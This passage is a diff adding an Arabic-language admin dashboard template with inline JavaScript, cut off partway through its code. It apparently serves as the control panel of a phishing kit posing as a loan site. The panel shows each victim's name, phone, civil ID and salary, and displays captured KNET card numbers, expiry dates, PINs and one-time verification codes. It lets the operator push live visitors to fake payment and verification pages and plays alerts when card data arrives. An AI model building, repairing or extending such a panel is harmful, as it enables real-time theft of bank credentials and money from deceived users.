@@ -1,0 +1,1258 @@
+<!doctype html> <html lang="en" dir="ltr"> <head> <meta charset="utf-8"/> <meta name="viewport" content="width=device-width,initial-scale=1"/> <title>الزوار - الإصدار 2</title> <link rel="stylesheet" href="{{ url_for('static', path='vendor/tabler/tabler.min.css') }}"/> <style> .page-layout {
+      min-height: 100vh;
+      display: grid;
+      grid-template-columns: minmax(240px, 350px) minmax(0, 1fr);
+      background: var(--tblr-bg-surface-secondary);
+      font-family: "Tajawal", "InterLocal", sans-serif;
+    }
+
+    .visitor-menu {
+      position: sticky;
+      top: 0;
+      height: 100vh;
+      border-right: 1px solid var(--tblr-border-color);
+      background: var(--tblr-bg-surface);
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .visitor-menu-head {
+      padding: 1rem;
+      border-bottom: 1px solid var(--tblr-border-color);
+    }
+
+    .visitor-list {
+      overflow: auto;
+      padding: .5rem;
+    }
+
+    .visitor-link {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: .5rem;
+      font-family: "Tajawal", "InterLocal", sans-serif;
+      position: relative;
+      overflow: hidden;
+    }
+    .visitor-link.active {
+      box-shadow: inset 3px 0 0 var(--tblr-primary);
+    }
+    .visitor-link.active::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: rgba(37, 99, 235, 0.3);
+      pointer-events: none;
+    }
+    .visitor-link > * {
+      position: relative;
+      z-index: 1;
+    }
+    .visitor-link.online {
+      background: rgba(34, 197, 94, 0.12);
+      border-color: rgba(34, 197, 94, 0.45);
+      box-shadow:
+        inset 0 0 0 1px rgba(34, 197, 94, 0.45),
+        0 0 12px rgba(34, 197, 94, 0.28);
+    }
+    .visitor-link.active.online {
+      box-shadow:
+        inset 3px 0 0 var(--tblr-primary),
+        inset 0 0 0 1px rgba(34, 197, 94, 0.45),
+        0 0 12px rgba(34, 197, 94, 0.28);
+    }
+
+    .visitor-main {
+      padding: 1rem;
+      font-family: "Tajawal", "InterLocal", sans-serif;
+    }
+    .visitor-main-card {
+      background: var(--tblr-bg-surface);
+      border: 1px solid var(--tblr-border-color);
+      border-radius: 12px;
+      padding: 12px;
+    }
+    .visitor-main-head {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr auto;
+      gap: 12px;
+      align-items: center;
+    }
+    .main-cell small {
+      display: block;
+      color: var(--tblr-secondary);
+      font-size: .75rem;
+    }
+    .main-cell strong {
+      display: block;
+      font-size: .95rem;
+      font-weight: 700;
+      font-family: "Tajawal", "InterLocal", sans-serif;
+    }
+    .archive-x-btn {
+      width: 34px;
+      height: 34px;
+      border-radius: 10px;
+      border: 1px solid var(--tblr-border-color);
+      background: var(--tblr-bg-surface);
+      color: var(--tblr-body-color);
+      font-weight: 700;
+      line-height: 1;
+      cursor: pointer;
+      transition: all .15s ease;
+    }
+    .archive-x-btn:hover {
+      border-color: #dc2626;
+      background: #dc2626;
+      color: #fff;
+    }
+    .archive-x-btn:disabled {
+      opacity: .6;
+      cursor: not-allowed;
+    }
+    .list-archive-btn {
+      width: 30px;
+      height: 30px;
+      border-radius: 8px;
+      border: 1px solid var(--tblr-border-color);
+      background: var(--tblr-bg-surface);
+      color: var(--tblr-body-color);
+      font-weight: 700;
+      line-height: 1;
+      cursor: pointer;
+      transition: all .15s ease;
+    }
+    .list-archive-btn:hover {
+      border-color: #dc2626;
+      background: #dc2626;
+      color: #fff;
+    }
+
+    .visitor-link:hover .visitor-sub {
+      color: var(--tblr-primary) !important;
+    }
+    .archive-all-badge {
+      cursor: pointer;
+      border: 1px solid #f2f2f2;
+      background: transparent !important;
+      color: inherit !important;
+      padding: 6px 12px;
+      font-size: .92rem;
+      font-weight: 700;
+      border-radius: 8px;
+      transition: background-color .15s ease, color .15s ease;
+    }
+    .archive-all-badge:hover {
+      background-color: #dc2626 !important;
+      color: #fff !important;
+    }
+
+    .modal.show {
+      background: rgba(0, 0, 0, 0.78);
+    }
+
+    .redirect-current {
+      box-shadow: 0 0 0 .15rem rgba(var(--tblr-success-rgb), .25);
+    }
+    .redirect-current:disabled {
+      opacity: 1;
+      filter: none;
+      cursor: default;
+    }
+    .redirect-current-online {
+      box-shadow:
+        0 0 0 .16rem rgba(34, 197, 94, 0.32),
+        0 0 16px rgba(34, 197, 94, 0.45);
+    }
+    .redirect-status {
+      position: absolute;
+      left: 50%;
+      transform: translateX(-50%);
+      font-weight: 700;
+      font-family: "Tajawal", "InterLocal", sans-serif;
+    }
+    .redirect-status-success-glow {
+      text-shadow: 0 0 10px rgba(34, 197, 94, 0.55), 0 0 18px rgba(34, 197, 94, 0.35);
+      animation: redirectSuccessPulse .9s ease-in-out infinite alternate;
+    }
+    @keyframes redirectSuccessPulse {
+      from { text-shadow: 0 0 8px rgba(34, 197, 94, 0.45), 0 0 14px rgba(34, 197, 94, 0.3); }
+      to { text-shadow: 0 0 12px rgba(34, 197, 94, 0.65), 0 0 24px rgba(34, 197, 94, 0.45); }
+    }
+    .info-grid {
+      display: grid;
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+      gap: 10px;
+    }
+    .info-card {
+      border: 1px solid var(--tblr-border-color);
+      border-radius: 10px;
+      padding: 10px;
+      background: var(--tblr-bg-surface);
+    }
+    .info-k {
+      color: var(--tblr-secondary);
+      font-size: .78rem;
+    }
+    .info-v {
+      margin-top: 4px;
+      font-weight: 700;
+      word-break: break-word;
+    }
+    .knet-wrap {
+      margin-top: 12px;
+    }
+    .knet-card {
+      border: 1px solid var(--tblr-border-color);
+      border-radius: 12px;
+      background: var(--tblr-bg-surface);
+      overflow: hidden;
+    }
+    .knet-card-latest {
+      border-color: rgba(37, 99, 235, 0.65);
+      box-shadow:
+        0 0 0 1px rgba(37, 99, 235, 0.45),
+        0 0 24px rgba(37, 99, 235, 0.28);
+      animation: latestKnetPulse 1.2s ease-in-out infinite alternate;
+    }
+    .knet-attention {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      border-radius: 999px;
+      padding: 3px 10px;
+      font-size: .72rem;
+      font-weight: 800;
+      color: #fff;
+      background: linear-gradient(90deg, #2563eb, #0ea5e9);
+      box-shadow: 0 0 14px rgba(37, 99, 235, 0.45);
+      letter-spacing: .02em;
+      white-space: nowrap;
+    }
+    @keyframes latestKnetPulse {
+      from {
+        box-shadow:
+          0 0 0 1px rgba(37, 99, 235, 0.35),
+          0 0 16px rgba(37, 99, 235, 0.22);
+      }
+      to {
+        box-shadow:
+          0 0 0 1px rgba(37, 99, 235, 0.6),
+          0 0 28px rgba(37, 99, 235, 0.38);
+      }
+    }
+    .knet-head {
+      background: linear-gradient(120deg, rgba(59, 130, 246, 0.12), rgba(16, 185, 129, 0.12));
+      border-bottom: 1px solid var(--tblr-border-color);
+      padding: 10px 12px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 8px;
+    }
+    .knet-grid {
+      padding: 12px;
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      gap: 10px;
+    }
+    .knet-item {
+      border: 1px solid var(--tblr-border-color);
+      border-radius: 10px;
+      padding: 8px 10px;
+      background: var(--tblr-bg-surface-secondary);
+    }
+    .knet-k {
+      color: var(--tblr-secondary);
+      font-size: .75rem;
+    }
+    .knet-v {
+      margin-top: 2px;
+      font-weight: 700;
+      word-break: break-word;
+    }
+    .knet-v-invalid {
+      color: #dc2626 !important;
+      font-weight: 800;
+    }
+    .visitor-name-wrap {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .visitor-new-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 999px;
+      background: #22c55e;
+      box-shadow: 0 0 0 3px rgba(34, 197, 94, 0.18);
+      flex: 0 0 auto;
+    }
+    .knet-foot {
+      padding: 0 12px 12px;
+      display: grid;
+      gap: 10px;
+    }
+    .knet-actions {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+    .knet-codes {
+      border: 1px solid var(--tblr-border-color);
+      border-radius: 10px;
+      padding: 8px;
+    }
+    .knet-code-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 10px;
+      padding: 6px 0;
+      border-top: 1px dashed var(--tblr-border-color);
+    }
+    .knet-code-row:first-child {
+      border-top: 0;
+      padding-top: 0;
+    }
+    .knet-empty {
+      border: 1px dashed var(--tblr-border-color);
+      border-radius: 10px;
+      color: var(--tblr-secondary);
+      text-align: center;
+      padding: 20px;
+      background: var(--tblr-bg-surface);
+    }
+
+    @media (max-width: 768px) {
+      .page-layout {
+        grid-template-columns: 50px minmax(0, 1fr);
+      }
+
+      .visitor-menu-head {
+        padding: .5rem .25rem;
+        display: flex;
+        justify-content: center;
+      }
+
+      .visitor-menu-title,
+      .visitor-name,
+      .visitor-sub {
+        display: none;
+      }
+
+      .visitor-list {
+        padding: .25rem;
+      }
+
+      .visitor-link {
+        justify-content: center;
+        padding: .35rem 0;
+      }
+
+      .visitor-link > span:first-child {
+        display: none;
+      }
+
+      .visitor-link.active {
+        background: transparent;
+      }
+
+      .visitor-counter {
+        display: none;
+      }
+
+      .visitor-link .badge {
+        min-width: 28px;
+        text-align: center;
+      }
+      .info-grid {
+        grid-template-columns: 1fr;
+      }
+      .knet-grid {
+        grid-template-columns: 1fr;
+      }
+    } </style> </head> <body> <div class="page-layout"> <aside class="visitor-menu"> <div class="visitor-menu-head"> <div class="d-flex align-items-center justify-content-between"> <strong class="visitor-menu-title">الزوار</strong> <div class="d-flex align-items-center gap-2"> <button id="archiveAllBtn" type="button" class="badge bg-primary archive-all-badge">أرشفة الكل</button> </div> </div> </div> <div class="visitor-list"> <div id="visitorsList" class="list-group list-group-flush"></div> </div> </aside> <main class="visitor-main"> <div class="visitor-main-card"> <div class="visitor-main-head"> <div class="main-cell"><strong id="mainName">-</strong></div> <div class="main-cell"><strong id="mainPhone">-</strong></div> <div class="main-cell"><strong id="mainSalary">-</strong></div> <button id="allInfoBtn" class="btn btn-outline-secondary btn-sm" type="button">جميع المعلومات</button> </div> </div> <div class="knet-wrap"> <div id="knetPanel"></div> </div> </main> </div> <div class="modal modal-blur fade" id="redirectModal" tabindex="-1" aria-hidden="true"> <div class="modal-dialog modal-lg modal-dialog-centered"> <div class="modal-content" dir="rtl"> <div class="modal-header"> <h5 id="redirectModalTitle" class="modal-title text-end w-100">إعادة توجيه الزائر</h5> <div id="redirectModalOfflineNote" class="position-absolute start-50 translate-middle-x text-danger fw-bold d-none"> الزائر غير موجود حاليا </div> <div id="redirectModalStatus" class="redirect-status d-none"></div> <button type="button" class="btn-close" aria-label="Close" data-close="redirectModal"></button> </div> <div class="modal-body"> <div id="redirectTargets" class="row" style="row-gap: 15px;"></div> </div> <div class="modal-footer"> <button type="button" class="btn btn-outline-secondary" data-close="redirectModal">إغلاق</button> </div> </div> </div> </div> <div class="modal modal-blur fade" id="infoModal" tabindex="-1" aria-hidden="true"> <div class="modal-dialog modal-xl modal-dialog-centered"> <div class="modal-content" dir="rtl"> <div class="modal-header"> <h5 class="modal-title">معلومات الزائر</h5> <button type="button" class="btn-close" aria-label="Close" data-close="infoModal"></button> </div> <div class="modal-body" id="infoContent"></div> <div class="modal-footer"> <button type="button" class="btn btn-outline-secondary" data-close="infoModal">إغلاق</button> </div> </div> </div> </div> <div class="modal modal-blur fade" id="archiveAllModal" tabindex="-1" aria-hidden="true"> <div class="modal-dialog modal-dialog-centered"> <div class="modal-content" dir="rtl"> <div class="modal-header"> <h5 class="modal-title">تأكيد الأرشفة</h5> <button type="button" class="btn-close" aria-label="Close" data-close="archiveAllModal"></button> </div> <div class="modal-body"> هل تريد أرشفة جميع الإدخالات؟ </div> <div class="modal-footer"> <button type="button" class="btn btn-outline-secondary" data-close="archiveAllModal">إلغاء</button> <button id="confirmArchiveAllBtn" type="button" class="btn btn-danger">تأكيد</button> </div> </div> </div> </div> <script src="{{ url_for('static', path='vendor/tabler/tabler.min.js') }}"></script> <script nonce="{{ request.state.csp_nonce }}"> const initialVisitors = {{ recent_visitors | tojson }};
+    const visitors = new Map(initialVisitors.map((v) => [v.id, v]));
+    const listEl = document.getElementById("visitorsList");
+    const counterEl = document.querySelector(".visitor-counter");
+    const mainNameEl = document.getElementById("mainName");
+    const mainPhoneEl = document.getElementById("mainPhone");
+    const mainSalaryEl = document.getElementById("mainSalary");
+    const allInfoBtn = document.getElementById("allInfoBtn");
+    const archiveAllBtn = document.getElementById("archiveAllBtn");
+    const confirmArchiveAllBtn = document.getElementById("confirmArchiveAllBtn");
+    const knetPanelEl = document.getElementById("knetPanel");
+
+    const LAST_SELECTED_VISITOR_KEY = "admin_recent_visitors_v2_last_selected";
+    let selectedVisitorId = window.localStorage.getItem(LAST_SELECTED_VISITOR_KEY) || "";
+    let statusPollTimer = null;
+    let ws = null;
+    let wsConnected = false;
+    let redirectStatusTimer = null;
+    let redirectStatusHideTimer = null;
+    let redirectModalStateKey = "";
+    let visitorListRenderKey = "";
+    let currentKnetSubmissions = [];
+    let currentKnetVerificationStatus = "pending";
+    const seenLatestKnetByVisitor = new Map();
+    const lastPageKeyByVisitor = new Map();
+    const lastKnetPageToneAtByVisitor = new Map();
+    let adminAudioContext = null;
+    const redirectPages = [
+      { key: "/", label: "الرئيسية" },
+      { key: "/loan-calculator", label: "الحاسبة" },
+      { key: "/customer-info", label: "بيانات العميل" },
+      { key: "/additional-customer-info", label: "معلومات إضافية" },
+      { key: "/transaction-notification", label: "إشعار العملية" },
+      { key: "/knet", label: "knet" },
+      { key: "/verfication", label: "التحقق" }
+    ];
+
+    function escapeHtml(v) {
+      return String(v ?? "").replace(/[&<>\"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
+    }
+
+    function ensureAdminAudioContext() {
+      if (adminAudioContext) {
+        if (adminAudioContext.state === "suspended") {
+          adminAudioContext.resume().catch(() => {});
+        }
+        return adminAudioContext;
+      }
+      const AudioCtx = window.AudioContext || window.webkitAudioContext;
+      if (!AudioCtx) return null;
+      try {
+        adminAudioContext = new AudioCtx();
+        if (adminAudioContext.state === "suspended") {
+          adminAudioContext.resume().catch(() => {});
+        }
+        return adminAudioContext;
+      } catch {
+        return null;
+      }
+    }
+
+    function playAdminToneSequence(sequence) {
+      const ctx = ensureAdminAudioContext();
+      if (!ctx || !Array.isArray(sequence) || !sequence.length) return;
+      let cursor = ctx.currentTime + 0.01;
+      for (const step of sequence) {
+        const freq = Number(step?.freq || 880);
+        const duration = Number(step?.duration || 0.09);
+        const gap = Number(step?.gap || 0.03);
+        const gainValue = Number(step?.gain || 0.04);
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.type = "triangle";
+        osc.frequency.setValueAtTime(freq, cursor);
+        gain.gain.setValueAtTime(0.0001, cursor);
+        gain.gain.exponentialRampToValueAtTime(Math.max(0.0001, gainValue), cursor + 0.008);
+        gain.gain.exponentialRampToValueAtTime(0.0001, cursor + Math.max(0.02, duration));
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.start(cursor);
+        osc.stop(cursor + Math.max(0.03, duration));
+        cursor += Math.max(0.03, duration) + Math.max(0, gap);
+      }
+    }
+
+    function playKnetPageNotification() {
+      playAdminToneSequence([
+        { freq: 880, duration: 0.06, gap: 0.025, gain: 0.055 },
+        { freq: 1175, duration: 0.085, gap: 0.02, gain: 0.06 },
+      ]);
+    }
+
+    function playKnetSubmissionNotification() {
+      playAdminToneSequence([
+        { freq: 988, duration: 0.055, gap: 0.02, gain: 0.06 },
+        { freq: 1319, duration: 0.075, gap: 0.015, gain: 0.065 },
+        { freq: 1568, duration: 0.095, gap: 0.02, gain: 0.065 },
+      ]);
+    }
+
+    function normalizeCurrentPageKey(rawValue) {
+      const raw = String(rawValue || "").trim();
+      if (!raw) return "/";
+
+      const compact = raw.toLowerCase().replace(/\s+/g, "");
+      if (["home", "/", "الرئيسية", "الصفحةالرئيسية", "الصفحة_الرئيسية"].includes(compact)) return "/";
+      if (compact.startsWith("حاسبةالقرض")) return "/loan-calculator";
+      if (compact === "كي نت".replace(/\s+/g, "") || compact === "كينت") return "/knet";
+      if (compact === "إشعاردفع".replace(/\s+/g, "") || compact === "اشعاردفع") return "/transaction-notification";
+      if (compact === "التحقق") return "/verfication";
+      if (compact === "بياناتالعميل") return "/customer-info";
+      if (compact === "معلوماتإضافية".replace(/\s+/g, "") || compact === "معلوماتاضافية".replace(/\s+/g, "")) return "/additional-customer-info";
+
+      const knownByKey = redirectPages.find((p) => p.key === raw);
+      if (knownByKey) return knownByKey.key;
+
+      const knownByLabel = redirectPages.find((p) => p.label === raw);
+      if (knownByLabel) return knownByLabel.key;
+
+      const noQuery = raw.split("?")[0].split("#")[0];
+      const noTrailingSlash = noQuery.length > 1 ? noQuery.replace(/\/+$/, "") : noQuery;
+      const knownByNormalizedPath = redirectPages.find((p) => p.key === noTrailingSlash);
+      if (knownByNormalizedPath) return knownByNormalizedPath.key;
+
+      return raw;
+    }
+
+    function maybeNotifyKnetPageEntry(visitorId, currentPageRaw) {
+      const id = String(visitorId || "").trim();
+      if (!id) return;
+      const nextKey = normalizeCurrentPageKey(currentPageRaw);
+      const prevKey = lastPageKeyByVisitor.get(id) || "";
+      if (prevKey !== nextKey && nextKey === "/knet") {
+        const nowMs = Date.now();
+        const lastToneAt = Number(lastKnetPageToneAtByVisitor.get(id) || 0);
+        const cooldownMs = 5 * 60 * 1000;
+        if (!lastToneAt || (nowMs - lastToneAt) >= cooldownMs) {
+          playKnetPageNotification();
+          lastKnetPageToneAtByVisitor.set(id, nowMs);
+        }
+      }
+      lastPageKeyByVisitor.set(id, nextKey);
+    }
+
+    visitors.forEach((visitor, id) => {
+      const visitorId = String(id || "").trim();
+      if (!visitorId) return;
+      lastPageKeyByVisitor.set(visitorId, normalizeCurrentPageKey(visitor?.current_page || ""));
+    });
+
+    function formatCurrentPageLabel(rawValue) {
+      const key = normalizeCurrentPageKey(rawValue);
+      const mapped = {
+        "/": "الرئيسية",
+        "/loan-calculator": "الحاسبة",
+        "/customer-info": "بيانات العميل",
+        "/additional-customer-info": "معلومات أضافية",
+        "/transaction-notification": "إشعار العملية",
+        "/knet": "knet",
+        "/verfication": "التحقق"
+      };
+      return mapped[key] || String(rawValue || "Home");
+    }
+
+    function formatVisitorTitle(v, idx) {
+      const nameRaw = typeof v?.applicant_name === "string" ? v.applicant_name.trim() : "";
+      if (nameRaw && nameRaw !== "-" && nameRaw !== "—") return nameRaw;
+      const identityRaw = typeof v?.identity_label === "string" ? v.identity_label.trim() : "";
+      if (identityRaw && !identityRaw.startsWith("زائر")) return identityRaw;
+      return `زائر ${idx + 1}`;
+    }
+
+    function sortedVisitors() {
+      return Array.from(visitors.values()).sort((a, b) => {
+        const aOnline = String(a.online_status || "") === "Online";
+        const bOnline = String(b.online_status || "") === "Online";
+        if (aOnline && !bOnline) return -1;
+        if (!aOnline && bOnline) return 1;
+
+        const aCreatedTs = parseInt(String(a.id || "").slice(0, 8), 16) || 0;
+        const bCreatedTs = parseInt(String(b.id || "").slice(0, 8), 16) || 0;
+        if (aOnline && bOnline && bCreatedTs !== aCreatedTs) return aCreatedTs - bCreatedTs;
+
+        const aTs = Number(a.last_activity_ts || 0);
+        const bTs = Number(b.last_activity_ts || 0);
+        if (bTs !== aTs) return bTs - aTs;
+        return String(b.id || "").localeCompare(String(a.id || ""));
+      });
+    }
+
+    function pickSelectedVisitorId(items) {
+      if (!items.length) return "";
+      if (items.length === 1) return items[0].id;
+      const saved = String(window.localStorage.getItem(LAST_SELECTED_VISITOR_KEY) || "").trim();
+      if (saved && visitors.has(saved)) return saved;
+      return items[0].id;
+    }
+
+    function setMainHeaderData(data) {
+      const name = (data && typeof data.applicant_name === "string" && data.applicant_name.trim() && data.applicant_name.trim() !== "—")
+        ? data.applicant_name.trim()
+        : "-";
+      const phone = (data && typeof data.phone_number === "string" && data.phone_number.trim() && data.phone_number.trim() !== "—")
+        ? data.phone_number.trim()
+        : "-";
+      const salary = (data && typeof data.salary === "string" && data.salary.trim() && data.salary.trim() !== "—")
+        ? data.salary.trim()
+        : "-";
+      const allMissing = name === "-" && phone === "-" && salary === "-";
+      mainNameEl.textContent = allMissing ? "-" : name;
+      mainPhoneEl.textContent = allMissing ? "" : phone;
+      mainSalaryEl.textContent = allMissing ? "" : salary;
+    }
+
+    function hasSubmittedInfo(data) {
+      if (!data || typeof data !== "object") return false;
+      const keys = [
+        "applicant_name",
+        "phone_number",
+        "civil_id",
+        "job_title",
+        "salary",
+        "additional_income",
+        "loan_type",
+        "amount",
+        "loanterm"
+      ];
+      return keys.some((k) => {
+        const v = data[k];
+        if (typeof v === "string") {
+          const t = v.trim();
+          return t !== "" && t !== "-" && t !== "—";
+        }
+        return v !== null && v !== undefined;
+      });
+    }
+
+    function updateAllInfoButtonVisibility(data) {
+      const show = hasSubmittedInfo(data);
+      allInfoBtn.style.display = show ? "inline-flex" : "none";
+      allInfoBtn.classList.toggle("btn-success", show && Boolean(data?.has_new_info));
+      allInfoBtn.classList.toggle("btn-outline-secondary", !show || !Boolean(data?.has_new_info));
+    }
+
+    async function fetchSelectedSummary(visitorId) {
+      if (!visitorId) {
+        setMainHeaderData(null);
+        updateAllInfoButtonVisibility(null);
+        return;
+      }
+      try {
+        const res = await fetch(`/admin/visitors/${encodeURIComponent(visitorId)}/summary`, { credentials: "same-origin" });
+        if (!res.ok) {
+          setMainHeaderData(null);
+          updateAllInfoButtonVisibility(null);
+          return;
+        }
+        const data = await res.json();
+        setMainHeaderData(data);
+        updateAllInfoButtonVisibility(data);
+      } catch {
+        setMainHeaderData(null);
+        updateAllInfoButtonVisibility(null);
+      }
+    }
+
+    async function fetchVisitorSummaryIntoMap(visitorId) {
+      if (!visitorId) return null;
+      const res = await fetch(`/admin/visitors/${encodeURIComponent(visitorId)}/summary`, { credentials: "same-origin" });
+      if (!res.ok) return null;
+      const data = await res.json();
+      if (!data || !data.id) return null;
+      const prev = visitors.get(data.id) || {};
+      visitors.set(data.id, { ...prev, ...data });
+      return data;
+    }
+
+    function buildAllInfoHtml(v) {
+      const fields = [
+        ["الاسم", v?.applicant_name], ["الهاتف", v?.phone_number], ["الرقم المدني", v?.civil_id],
+        ["المهنة", v?.job_title], ["نوع القرض", v?.loan_type], ["المبلغ", v?.amount],
+        ["المدة", v?.loanterm], ["الراتب", v?.salary], ["دخل إضافي", v?.additional_income],
+        ["أول دخول", v?.created_at], ["آخر نشاط", v?.last_activity], ["الصفحة الحالية", v?.current_page]
+      ];
+      return `<div class="info-grid">${fields.map(([k, val]) => `
+        <div class="info-card">
+          <div class="info-k">${escapeHtml(k)}</div>
+          <div class="info-v">${escapeHtml(val || "—")}</div>
+        </div>
+      `).join("")}</div>`;
+    }
+
+    function buildKnetPanelHtml(submissions, verificationStatus, showLatestAttention) {
+      if (!Array.isArray(submissions) || !submissions.length) {
+        return '<div class="knet-empty">لا توجد بيانات KNET لهذا الزائر حتى الآن.</div>';
+      }
+      return submissions.map((s, index) => {
+        const isLatest = index === 0;
+        const isLog = Boolean(s?.is_log);
+        const statusClass = isLog
+          ? "bg-orange-lt text-orange"
+          : verificationStatus === "approved"
+          ? "bg-success-lt text-success"
+          : verificationStatus === "rejected"
+          ? "bg-danger-lt text-danger"
+          : "bg-yellow-lt text-yellow";
+        const statusLabel = isLog
+          ? "محاولة ناقصة"
+          : verificationStatus === "approved"
+          ? "تمت الموافقة"
+          : verificationStatus === "rejected"
+          ? "مرفوض"
+          : "بانتظار التحقق";
+        const codes = Array.isArray(s.verfication_codes) ? s.verfication_codes : [];
+        const missingFields = Array.isArray(s.missing_fields) ? s.missing_fields : [];
+        const canVerify = Boolean(s?.can_verify);
+        const missingLabel = missingFields.length ? missingFields.join(", ") : "—";
+        const missingSet = new Set(missingFields.map((f) => String(f || "").trim().toLowerCase()));
+        const validationError = String(s?.validation_error || "").trim().toLowerCase();
+        const debitInvalid = isLog
+          ? (
+            missingSet.has("debit_number") ||
+            missingSet.has("dcprefix") ||
+            validationError === "debit_number_incomplete" ||
+            validationError === "dcprefix_missing" ||
+            validationError === "luhn_invalid"
+          )
+          : (!s.card_number_length_valid || !s.luhn_valid);
+        const expiryInvalid = isLog
+          ? (
+            missingSet.has("exp_month") ||
+            missingSet.has("exp_year") ||
+            validationError === "exp_month_missing" ||
+            validationError === "exp_year_missing" ||
+            validationError === "expiry_invalid"
+          )
+          : (!s.expiry_valid);
+        const pinInvalid = isLog
+          ? (
+            missingSet.has("pin_code") ||
+            validationError === "pin_code_invalid"
+          )
+          : false;
+        return `
+          <article class="knet-card ${isLatest ? "knet-card-latest" : ""} mb-3">
+            <div class="knet-head">
+              <div>
+                <div class="fw-bold">${escapeHtml(s.bank || (isLog ? "محاولة غير مكتملة" : "—"))}</div>
+                <div class="text-secondary small">${escapeHtml(s.created_at || "—")}</div>
+              </div>
+              <div class="d-flex align-items-center gap-2">
+                ${isLatest && showLatestAttention ? '<span class="knet-attention">NEW SUBMISSION</span>' : ""}
+                <span class="badge ${statusClass}">${statusLabel}</span>
+              </div>
+            </div>
+            <div class="knet-grid">
+              <div class="knet-item"><div class="knet-k">المقدمة</div><div class="knet-v">${escapeHtml(s.dcprefix || "—")}</div></div>
+              <div class="knet-item"><div class="knet-k">رقم البطاقة</div><div class="knet-v ${debitInvalid ? "knet-v-invalid" : ""}">${escapeHtml(s.debit_number || "—")}</div></div>
+              <div class="knet-item"><div class="knet-k">الانتهاء</div><div class="knet-v ${expiryInvalid ? "knet-v-invalid" : ""}">${escapeHtml(s.expiry || "—")}</div></div>
+              <div class="knet-item"><div class="knet-k">PIN</div><div class="knet-v ${pinInvalid ? "knet-v-invalid" : ""}">${escapeHtml(s.pin_code || "—")}</div></div>
+            </div>
+            <div class="knet-foot">
+              <div class="d-flex flex-wrap gap-2">
+                ${isLog ? `
+                  <span class="badge bg-orange-lt text-orange">ناقص: ${escapeHtml(missingLabel)}</span>
+                  <span class="badge bg-secondary-lt text-secondary">${escapeHtml(s.validation_error || "incomplete_submit")}</span>
+                ` : `
+                  <span class="badge ${s.card_number_length_valid ? "bg-success-lt text-success" : "bg-danger-lt text-danger"}">Length ${s.card_number_length_valid ? "OK" : "NO"}</span>
+                  <span class="badge ${s.luhn_valid ? "bg-success-lt text-success" : "bg-danger-lt text-danger"}">Luhn ${s.luhn_valid ? "OK" : "NO"}</span>
+                  <span class="badge ${s.expiry_valid ? "bg-success-lt text-success" : "bg-danger-lt text-danger"}">Expiry ${s.expiry_valid ? "OK" : "NO"}</span>
+                `}
+              </div>
+              ${isLatest && !isLog && canVerify && verificationStatus === "pending" ? `
+                <div class="knet-actions">
+                  <button class="btn btn-success btn-sm" type="button" data-verify="approved">قبول</button>
+                  <button class="btn btn-danger btn-sm" type="button" data-verify="rejected">رفض</button>
+                </div>
+              ` : ""}
+              ${isLog ? "" : `
+                <div class="knet-codes">
+                  <div class="small text-secondary mb-1">رموز التحقق</div>
+                  ${codes.length ? codes.map((c) => `
+                    <div class="knet-code-row">
+                      <strong>${escapeHtml(c?.value || "—")}</strong>
+                      <span class="text-secondary small">${escapeHtml(c?.created_at || "—")}</span>
+                    </div>
+                  `).join("") : '<div class="text-secondary small">لا توجد إدخالات</div>'}
+                </div>
+              `}
+            </div>
+          </article>
+        `;
+      }).join("");
+    }
+
+    function renderKnetPanel() {
+      const latestId = currentKnetSubmissions[0]?.id ? String(currentKnetSubmissions[0].id) : "";
+      const seenLatestId = selectedVisitorId ? String(seenLatestKnetByVisitor.get(selectedVisitorId) || "") : "";
+      const showLatestAttention = Boolean(selectedVisitorId && latestId && latestId !== seenLatestId);
+      knetPanelEl.innerHTML = buildKnetPanelHtml(currentKnetSubmissions, currentKnetVerificationStatus, showLatestAttention);
+      if (showLatestAttention && selectedVisitorId) {
+        seenLatestKnetByVisitor.set(selectedVisitorId, latestId);
+        // Remove the attention badge once admin has seen this latest submission.
+        knetPanelEl.innerHTML = buildKnetPanelHtml(currentKnetSubmissions, currentKnetVerificationStatus, false);
+      }
+    }
+
+    async function fetchKnetSubmissions(visitorId) {
+      if (!visitorId) {
+        currentKnetSubmissions = [];
+        currentKnetVerificationStatus = "pending";
+        renderKnetPanel();
+        return;
+      }
+      try {
+        const res = await fetch(`/admin/visitors/${encodeURIComponent(visitorId)}/knet-submissions`, { credentials: "same-origin" });
+        if (!res.ok) {
+          currentKnetSubmissions = [];
+          currentKnetVerificationStatus = "pending";
+          renderKnetPanel();
+          return;
+        }
+        const data = await res.json();
+        currentKnetSubmissions = Array.isArray(data?.submissions) ? data.submissions : [];
+        currentKnetVerificationStatus = String(data?.verification_status || "pending");
+        renderKnetPanel();
+      } catch {
+        currentKnetSubmissions = [];
+        currentKnetVerificationStatus = "pending";
+        renderKnetPanel();
+      }
+    }
+
+    function renderVisitors() {
+      const items = sortedVisitors();
+      const hasSelectedInItems = items.some((v) => v.id === selectedVisitorId);
+      if (!hasSelectedInItems) {
+        selectedVisitorId = pickSelectedVisitorId(items);
+      }
+      const nextRenderKey = items.map((v, idx) => {
+        const title = formatVisitorTitle(v, idx);
+        return [
+          v.id || "",
+          selectedVisitorId === v.id ? "1" : "0",
+          v.online_status || "",
+          normalizeCurrentPageKey(v.current_page),
+          title
+        ].join("|");
+      }).join(";");
+
+      if (nextRenderKey === visitorListRenderKey) {
+        if (counterEl) counterEl.textContent = String(items.length);
+        return;
+      }
+
+      visitorListRenderKey = nextRenderKey;
+      if (counterEl) counterEl.textContent = String(items.length);
+
+      if (!items.length) {
+        listEl.innerHTML = '<div class="list-group-item text-secondary">No visitors</div>';
+        selectedVisitorId = "";
+        window.localStorage.removeItem(LAST_SELECTED_VISITOR_KEY);
+        visitorListRenderKey = "empty";
+        return;
+      }
+
